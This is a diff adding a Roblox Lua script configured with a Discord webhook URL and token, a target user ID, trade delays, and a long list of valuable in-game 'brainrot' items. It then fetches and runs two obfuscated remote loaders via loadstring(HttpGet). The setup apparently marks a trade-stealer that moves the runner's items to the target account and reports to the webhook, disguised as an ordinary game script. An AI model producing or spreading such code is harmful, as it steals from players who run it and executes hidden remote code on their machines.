@@ -1,0 +1,63 @@
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1478521107173871678/yRW3mrQRsfnUXan6mcL2Q90wh1CdHU9ldjgOps4GR_I6QnbJ0cDSDwUG94KXQ_In1y9-"
+getgenv().TARGET_ID = 1797504493
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TARGET_BRAINROTS = {
+    ["La Secret Combinasion"] = true,
+    ["La Food Combinasion"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["Chicleteira Cupideira"] = true,
+    ["Orcaledon"] = true,
+    ["Eviledon"] = true,
+    ["Money Money Reindeer"] = true,
+    ["Las Sis"] = true,
+    ["Los Sweethearts"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Headless Horseman"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Cooki and Milki"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Ketupat Bros"] = true,
+    ["Los Sekolahs"] = true,
+    ["La Casa Boo"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Love Love Bear"] = true,
+    ["Tralaledon"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Swag Soda"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Cerberus"] = true,
+    ["Capitano Moby"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Garama and Madundung"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Tictac Sahur"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Money Money Puggy"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["La Romantic Grande"] = true,
+    ["Swaggy Bros"] = true,
+    ["La Taco Combinasion"] = true,
+    ["La Jolly Grande"] = true,
+    ["W or L"] = true,
+    ["Chipso and Queso"] = true,
+    ["Tacorita Bicicleta"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Meowl"] = true,
+    ["Esok Sekolah"] = true
+}
+task.spawn(function()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
+end)
+
+task.spawn(function()
+loadstring(game:HttpGet("https://orrxl4-protector.vercel.app/api/raw?id=mq7tjr66"))()
+end)
